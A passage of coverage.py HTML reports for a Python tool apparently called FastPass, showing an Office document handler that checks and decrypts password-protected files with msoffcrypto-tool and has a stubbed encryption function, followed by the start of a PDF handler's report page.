    <p class="mis show_mis"><span class="n"><a id="t26" href="#t26">26</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">logger</span> <span class="op">=</span> <span class="nam">logger</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t27" href="#t27">27</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t28" href="#t28">28</a></span><span class="t">        <span class="key">if</span> <span class="nam">msoffcrypto</span> <span class="key">is</span> <span class="key">None</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t29" href="#t29">29</a></span><span class="t">            <span class="key">raise</span> <span class="nam">ImportError</span><span class="op">(</span><span class="str">"msoffcrypto-tool is required for Office document processing"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t30" href="#t30">30</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t31" href="#t31">31</a></span><span class="t">        <span class="com"># C2a_Config: Configure Office Settings</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t32" href="#t32">32</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">timeout</span> <span class="op">=</span> <span class="num">30</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t33" href="#t33">33</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">encryption_algorithm</span> <span class="op">=</span> <span class="str">'AES-256'</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t34" href="#t34">34</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t35" href="#t35">35</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">logger</span><span class="op">.</span><span class="nam">debug</span><span class="op">(</span><span class="str">"Office document handler initialized"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t36" href="#t36">36</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t37" href="#t37">37</a></span><span class="t">    <span class="key">def</span> <span class="nam">configure</span><span class="op">(</span><span class="nam">self</span><span class="op">,</span> <span class="nam">config</span><span class="op">:</span> <span class="nam">Dict</span><span class="op">[</span><span class="nam">str</span><span class="op">,</span> <span class="nam">Any</span><span class="op">]</span><span class="op">)</span> <span class="op">-></span> <span class="key">None</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t38" href="#t38">38</a></span><span class="t">        <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t39" href="#t39">39</a></span><span class="t"><span class="str">        C2a: Configure Office Handler</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t40" href="#t40">40</a></span><span class="t"><span class="str">        Set Office-specific configuration options</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t41" href="#t41">41</a></span><span class="t"><span class="str">        """</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t42" href="#t42">42</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">timeout</span> <span class="op">=</span> <span class="nam">config</span><span class="op">.</span><span class="nam">get</span><span class="op">(</span><span class="str">'office_timeout'</span><span class="op">,</span> <span class="nam">self</span><span class="op">.</span><span class="nam">timeout</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t43" href="#t43">43</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t44" href="#t44">44</a></span><span class="t">        <span class="com"># Log experimental encryption warning</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t45" href="#t45">45</a></span><span class="t">        <span class="key">if</span> <span class="nam">config</span><span class="op">.</span><span class="nam">get</span><span class="op">(</span><span class="str">'debug'</span><span class="op">,</span> <span class="key">False</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t46" href="#t46">46</a></span><span class="t">            <span class="nam">self</span><span class="op">.</span><span class="nam">logger</span><span class="op">.</span><span class="nam">warning</span><span class="op">(</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis mis2 show_mis"><span class="n"><a id="t47" href="#t47">47</a></span><span class="t">                <span class="str">"Office document encryption is EXPERIMENTAL. "</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis mis2 show_mis"><span class="n"><a id="t48" href="#t48">48</a></span><span class="t">                <span class="str">"Decryption is fully supported."</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis mis2 show_mis"><span class="n"><a id="t49" href="#t49">49</a></span><span class="t">            <span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t50" href="#t50">50</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t51" href="#t51">51</a></span><span class="t">    <span class="key">def</span> <span class="nam">test_password</span><span class="op">(</span><span class="nam">self</span><span class="op">,</span> <span class="nam">file_path</span><span class="op">:</span> <span class="nam">Path</span><span class="op">,</span> <span class="nam">password</span><span class="op">:</span> <span class="nam">str</span><span class="op">)</span> <span class="op">-></span> <span class="nam">bool</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t52" href="#t52">52</a></span><span class="t">        <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t53" href="#t53">53</a></span><span class="t"><span class="str">        Test if password works for Office document</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t54" href="#t54">54</a></span><span class="t"><span class="str">        Returns True if password is correct, False otherwise</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t55" href="#t55">55</a></span><span class="t"><span class="str">        """</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t56" href="#t56">56</a></span><span class="t">        <span class="key">try</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t57" href="#t57">57</a></span><span class="t">            <span class="key">with</span> <span class="nam">open</span><span class="op">(</span><span class="nam">file_path</span><span class="op">,</span> <span class="str">'rb'</span><span class="op">)</span> <span class="key">as</span> <span class="nam">f</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t58" href="#t58">58</a></span><span class="t">                <span class="nam">office_file</span> <span class="op">=</span> <span class="nam">msoffcrypto</span><span class="op">.</span><span class="nam">OfficeFile</span><span class="op">(</span><span class="nam">f</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t59" href="#t59">59</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t60" href="#t60">60</a></span><span class="t">                <span class="key">if</span> <span class="key">not</span> <span class="nam">office_file</span><span class="op">.</span><span class="nam">is_encrypted</span><span class="op">(</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t61" href="#t61">61</a></span><span class="t">                    <span class="com"># File is not encrypted, so any password "works" for decryption</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t62" href="#t62">62</a></span><span class="t">                    <span class="key">return</span> <span class="key">True</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t63" href="#t63">63</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t64" href="#t64">64</a></span><span class="t">                <span class="com"># Try to load with password</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t65" href="#t65">65</a></span><span class="t">                <span class="nam">office_file</span><span class="op">.</span><span class="nam">load_key</span><span class="op">(</span><span class="nam">password</span><span class="op">=</span><span class="nam">password</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t66" href="#t66">66</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t67" href="#t67">67</a></span><span class="t">                <span class="com"># Try to decrypt a small portion to verify password</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t68" href="#t68">68</a></span><span class="t">                <span class="key">with</span> <span class="nam">tempfile</span><span class="op">.</span><span class="nam">NamedTemporaryFile</span><span class="op">(</span><span class="op">)</span> <span class="key">as</span> <span class="nam">temp_file</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t69" href="#t69">69</a></span><span class="t">                    <span class="nam">office_file</span><span class="op">.</span><span class="nam">decrypt</span><span class="op">(</span><span class="nam">temp_file</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t70" href="#t70">70</a></span><span class="t">                    <span class="nam">temp_file</span><span class="op">.</span><span class="nam">seek</span><span class="op">(</span><span class="num">0</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t71" href="#t71">71</a></span><span class="t">                    <span class="com"># If we can read some data, password is correct</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t72" href="#t72">72</a></span><span class="t">                    <span class="nam">data</span> <span class="op">=</span> <span class="nam">temp_file</span><span class="op">.</span><span class="nam">read</span><span class="op">(</span><span class="num">100</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t73" href="#t73">73</a></span><span class="t">                    <span class="key">return</span> <span class="nam">len</span><span class="op">(</span><span class="nam">data</span><span class="op">)</span> <span class="op">></span> <span class="num">0</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t74" href="#t74">74</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t75" href="#t75">75</a></span><span class="t">        <span class="key">except</span> <span class="nam">Exception</span> <span class="key">as</span> <span class="nam">e</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t76" href="#t76">76</a></span><span class="t">            <span class="nam">self</span><span class="op">.</span><span class="nam">logger</span><span class="op">.</span><span class="nam">debug</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Password test failed for </span><span class="op">{</span><span class="nam">file_path</span><span class="op">}</span><span class="fst">: </span><span class="op">{</span><span class="nam">e</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t77" href="#t77">77</a></span><span class="t">            <span class="key">return</span> <span class="key">False</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t78" href="#t78">78</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t79" href="#t79">79</a></span><span class="t">    <span class="key">def</span> <span class="nam">encrypt_file</span><span class="op">(</span><span class="nam">self</span><span class="op">,</span> <span class="nam">input_path</span><span class="op">:</span> <span class="nam">Path</span><span class="op">,</span> <span class="nam">output_path</span><span class="op">:</span> <span class="nam">Path</span><span class="op">,</span> <span class="nam">password</span><span class="op">:</span> <span class="nam">str</span><span class="op">)</span> <span class="op">-></span> <span class="key">None</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t80" href="#t80">80</a></span><span class="t">        <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t81" href="#t81">81</a></span><span class="t"><span class="str">        Encrypt Office document with password</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t82" href="#t82">82</a></span><span class="t"><span class="str">        Note: This is experimental functionality</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t83" href="#t83">83</a></span><span class="t"><span class="str">        """</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t84" href="#t84">84</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t85" href="#t85">85</a></span><span class="t">        <span class="com"># Log experimental warning</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t86" href="#t86">86</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">logger</span><span class="op">.</span><span class="nam">warning</span><span class="op">(</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis mis2 show_mis"><span class="n"><a id="t87" href="#t87">87</a></span><span class="t">            <span class="fst">f"</span><span class="fst">EXPERIMENTAL: Encrypting </span><span class="op">{</span><span class="nam">input_path</span><span class="op">.</span><span class="nam">name</span><span class="op">}</span><span class="fst"> with Office encryption</span><span class="fst">"</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis mis2 show_mis"><span class="n"><a id="t88" href="#t88">88</a></span><span class="t">        <span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t89" href="#t89">89</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t90" href="#t90">90</a></span><span class="t">        <span class="key">try</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t91" href="#t91">91</a></span><span class="t">            <span class="com"># For Office encryption, we need to use a different approach</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t92" href="#t92">92</a></span><span class="t">            <span class="com"># msoffcrypto-tool primarily supports decryption</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t93" href="#t93">93</a></span><span class="t">            <span class="com"># For encryption, we would need to use Office automation or other tools</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t94" href="#t94">94</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t95" href="#t95">95</a></span><span class="t">            <span class="com"># This is a placeholder implementation</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t96" href="#t96">96</a></span><span class="t">            <span class="com"># In a real implementation, you might use:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t97" href="#t97">97</a></span><span class="t">            <span class="com"># - Office COM automation (Windows only)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t98" href="#t98">98</a></span><span class="t">            <span class="com"># - LibreOffice command line tools</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t99" href="#t99">99</a></span><span class="t">            <span class="com"># - Or other encryption methods</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t100" href="#t100">100</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t101" href="#t101">101</a></span><span class="t">            <span class="key">raise</span> <span class="nam">NotImplementedError</span><span class="op">(</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis mis2 show_mis"><span class="n"><a id="t102" href="#t102">102</a></span><span class="t">                <span class="str">"Office document encryption is not yet implemented. "</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis mis2 show_mis"><span class="n"><a id="t103" href="#t103">103</a></span><span class="t">                <span class="str">"Use Microsoft Office or LibreOffice to encrypt documents manually."</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis mis2 show_mis"><span class="n"><a id="t104" href="#t104">104</a></span><span class="t">            <span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t105" href="#t105">105</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t106" href="#t106">106</a></span><span class="t">        <span class="key">except</span> <span class="nam">Exception</span> <span class="key">as</span> <span class="nam">e</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t107" href="#t107">107</a></span><span class="t">            <span class="key">raise</span> <span class="nam">Exception</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Failed to encrypt Office document </span><span class="op">{</span><span class="nam">input_path</span><span class="op">}</span><span class="fst">: </span><span class="op">{</span><span class="nam">e</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t108" href="#t108">108</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t109" href="#t109">109</a></span><span class="t">    <span class="key">def</span> <span class="nam">decrypt_file</span><span class="op">(</span><span class="nam">self</span><span class="op">,</span> <span class="nam">input_path</span><span class="op">:</span> <span class="nam">Path</span><span class="op">,</span> <span class="nam">output_path</span><span class="op">:</span> <span class="nam">Path</span><span class="op">,</span> <span class="nam">password</span><span class="op">:</span> <span class="nam">str</span><span class="op">)</span> <span class="op">-></span> <span class="key">None</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t110" href="#t110">110</a></span><span class="t">        <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t111" href="#t111">111</a></span><span class="t"><span class="str">        Decrypt Office document with password</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t112" href="#t112">112</a></span><span class="t"><span class="str">        Full decryption support using msoffcrypto-tool</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t113" href="#t113">113</a></span><span class="t"><span class="str">        """</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t114" href="#t114">114</a></span><span class="t">        <span class="key">try</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t115" href="#t115">115</a></span><span class="t">            <span class="key">with</span> <span class="nam">open</span><span class="op">(</span><span class="nam">input_path</span><span class="op">,</span> <span class="str">'rb'</span><span class="op">)</span> <span class="key">as</span> <span class="nam">f</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t116" href="#t116">116</a></span><span class="t">                <span class="nam">office_file</span> <span class="op">=</span> <span class="nam">msoffcrypto</span><span class="op">.</span><span class="nam">OfficeFile</span><span class="op">(</span><span class="nam">f</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t117" href="#t117">117</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t118" href="#t118">118</a></span><span class="t">                <span class="key">if</span> <span class="key">not</span> <span class="nam">office_file</span><span class="op">.</span><span class="nam">is_encrypted</span><span class="op">(</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t119" href="#t119">119</a></span><span class="t">                    <span class="com"># File is not encrypted, just copy it</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t120" href="#t120">120</a></span><span class="t">                    <span class="nam">shutil</span><span class="op">.</span><span class="nam">copy2</span><span class="op">(</span><span class="nam">input_path</span><span class="op">,</span> <span class="nam">output_path</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t121" href="#t121">121</a></span><span class="t">                    <span class="nam">self</span><span class="op">.</span><span class="nam">logger</span><span class="op">.</span><span class="nam">info</span><span class="op">(</span><span class="fst">f"</span><span class="fst">File </span><span class="op">{</span><span class="nam">input_path</span><span class="op">.</span><span class="nam">name</span><span class="op">}</span><span class="fst"> was not encrypted, copied as-is</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t122" href="#t122">122</a></span><span class="t">                    <span class="key">return</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t123" href="#t123">123</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t124" href="#t124">124</a></span><span class="t">                <span class="com"># Load the password</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t125" href="#t125">125</a></span><span class="t">                <span class="nam">office_file</span><span class="op">.</span><span class="nam">load_key</span><span class="op">(</span><span class="nam">password</span><span class="op">=</span><span class="nam">password</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t126" href="#t126">126</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t127" href="#t127">127</a></span><span class="t">                <span class="com"># Decrypt to output file</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t128" href="#t128">128</a></span><span class="t">                <span class="key">with</span> <span class="nam">open</span><span class="op">(</span><span class="nam">output_path</span><span class="op">,</span> <span class="str">'wb'</span><span class="op">)</span> <span class="key">as</span> <span class="nam">output_file</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t129" href="#t129">129</a></span><span class="t">                    <span class="nam">office_file</span><span class="op">.</span><span class="nam">decrypt</span><span class="op">(</span><span class="nam">output_file</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t130" href="#t130">130</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t131" href="#t131">131</a></span><span class="t">                <span class="nam">self</span><span class="op">.</span><span class="nam">logger</span><span class="op">.</span><span class="nam">info</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Successfully decrypted </span><span class="op">{</span><span class="nam">input_path</span><span class="op">.</span><span class="nam">name</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t132" href="#t132">132</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t133" href="#t133">133</a></span><span class="t">        <span class="key">except</span> <span class="nam">Exception</span> <span class="key">as</span> <span class="nam">e</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t134" href="#t134">134</a></span><span class="t">            <span class="key">raise</span> <span class="nam">Exception</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Failed to decrypt Office document </span><span class="op">{</span><span class="nam">input_path</span><span class="op">}</span><span class="fst">: </span><span class="op">{</span><span class="nam">e</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t135" href="#t135">135</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t136" href="#t136">136</a></span><span class="t">    <span class="key">def</span> <span class="nam">cleanup</span><span class="op">(</span><span class="nam">self</span><span class="op">)</span> <span class="op">-></span> <span class="key">None</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t137" href="#t137">137</a></span><span class="t">        <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t138" href="#t138">138</a></span><span class="t"><span class="str">        E2d: Call Handler Cleanup</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t139" href="#t139">139</a></span><span class="t"><span class="str">        Clean up any handler-specific resources</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t140" href="#t140">140</a></span><span class="t"><span class="str">        """</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t141" href="#t141">141</a></span><span class="t">        <span class="com"># Office handler doesn't maintain persistent resources</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t142" href="#t142">142</a></span><span class="t">        <span class="key">pass</span>&nbsp;</span><span class="r"></span></p>
</main>
<footer>
    <div class="content">
        <p>
            <a class="nav" href="z_ae6ae744f2ec6f26___init___py.html">&#xab; prev</a> &nbsp; &nbsp;
            <a class="nav" href="index.html">&Hat; index</a> &nbsp; &nbsp;
            <a class="nav" href="z_ae6ae744f2ec6f26_pdf_handler_py.html">&#xbb; next</a>
            &nbsp; &nbsp; &nbsp;
            <a class="nav" href="https://coverage.readthedocs.io/en/7.10.0">coverage.py v7.10.0</a>,
            created at 2025-07-26 17:08 -0400
        </p>
    </div>
</footer>
</body>
</html>
</file>

<file path="reports/coverage/z_ae6ae744f2ec6f26_pdf_handler_py.html">
<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>Coverage for src\core\crypto_handlers\pdf_handler.py: 74%</title>
    <link rel="icon" sizes="32x32" href="favicon_32_cb_58284776.png">
    <link rel="stylesheet" href="style_cb_dca529e9.css" type="text/css">
    <script src="coverage_html_cb_497bf287.js" defer></script>
</head>
<body class="pyfile">
<header>
    <div class="content">
        <h1>
            <span class="text">Coverage for </span><b>src\core\crypto_handlers\pdf_handler.py</b>:
            <span class="pc_cov">74%</span>
        </h1>
        <aside id="help_panel_wrapper">
            <input id="help_panel_state" type="checkbox">
            <label for="help_panel_state">
                <img id="keyboard_icon" src="keybd_closed_cb_ce680311.png" alt="Show/hide keyboard shortcuts">
            </label>
            <div id="help_panel">
                <p class="legend">Shortcuts on this page</p>
                <div class="keyhelp">
                    <p>
                        <kbd>r</kbd>
                        <kbd>m</kbd>
                        <kbd>x</kbd>
                        &nbsp; toggle line displays
                    </p>
                    <p>
                        <kbd>j</kbd>
                        <kbd>k</kbd>
                        &nbsp; next/prev highlighted chunk
                    </p>
                    <p>
                        <kbd>0</kbd> &nbsp; (zero) top of page
                    </p>
                    <p>
                        <kbd>1</kbd> &nbsp; (one) first highlighted chunk
                    </p>
                    <p>
                        <kbd>[</kbd>
                        <kbd>]</kbd>
                        &nbsp; prev/next file
                    </p>
                    <p>
                        <kbd>u</kbd> &nbsp; up to the index
                    </p>
                    <p>
                        <kbd>?</kbd> &nbsp; show/hide this help
                    </p>
                </div>
            </div>
        </aside>
        <h2>
            <span class="text">66 statements &nbsp;</span>
            <button type="button" class="run button_toggle_run" value="run" data-shortcut="r" title="Toggle lines run">49<span class="text"> run</span></button>
            <button type="button" class="mis show_mis button_toggle_mis" value="mis" data-shortcut="m" title="Toggle lines missing">17<span class="text"> missing</span></button>
            <button type="button" class="exc show_exc button_toggle_exc" value="exc" data-shortcut="x" title="Toggle lines excluded">0<span class="text"> excluded</span></button>
        </h2>
        <p class="text">
            <a id="prevFileLink" class="nav" href="z_ae6ae744f2ec6f26_office_handler_py.html">&#xab; prev</a> &nbsp; &nbsp;
            <a id="indexLink" class="nav" href="index.html">&Hat; index</a> &nbsp; &nbsp;
            <a id="nextFileLink" class="nav" href="z_ce21df766c911d41_file_handler_py.html">&#xbb; next</a>
            &nbsp; &nbsp; &nbsp;
            <a class="nav" href="https://coverage.readthedocs.io/en/7.10.0">coverage.py v7.10.0</a>,
            created at 2025-07-26 17:08 -0400
        </p>
        <aside class="hidden">
            <button type="button" class="button_next_chunk" data-shortcut="j"></button>
            <button type="button" class="button_prev_chunk" data-shortcut="k"></button>
            <button type="button" class="button_top_of_page" data-shortcut="0"></button>
            <button type="button" class="button_first_chunk" data-shortcut="1"></button>
            <button type="button" class="button_prev_file" data-shortcut="["></button>
            <button type="button" class="button_next_file" data-shortcut="]"></button>
            <button type="button" class="button_to_index" data-shortcut="u"></button>
            <button type="button" class="button_show_hide_help" data-shortcut="?"></button>
        </aside>
    </div>
</header>
<main id="source">
    <p class="pln"><span class="n"><a id="t1" href="#t1">1</a></span><span class="t"><span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t2" href="#t2">2</a></span><span class="t"><span class="str">FastPass PDF Handler</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t3" href="#t3">3</a></span><span class="t"><span class="str">Maps to: C1d_PDF, C2b_Config - PyPDF2 integration</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t4" href="#t4">4</a></span><span class="t"><span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t5" href="#t5">5</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t6" href="#t6">6</a></span><span class="t"><span class="com"># A1a: Load System Tools</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t7" href="#t7">7</a></span><span class="t"><span class="key">import</span> <span class="nam">logging</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t8" href="#t8">8</a></span><span class="t"><span class="key">from</span> <span class="nam">pathlib</span> <span class="key">import</span> <span class="nam">Path</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t9" href="#t9">9</a></span><span class="t"><span class="key">from</span> <span class="nam">typing</span> <span class="key">import</span> <span class="nam">Dict</span><span class="op">,</span> <span class="nam">Any</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t10" href="#t10">10</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t11" href="#t11">11</a></span><span class="t"><span class="key">try</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t12" href="#t12">12</a></span><span class="t">    <span class="key">import</span> <span class="nam">PyPDF2</span>&nbsp;</span><span class="r"></span></p>
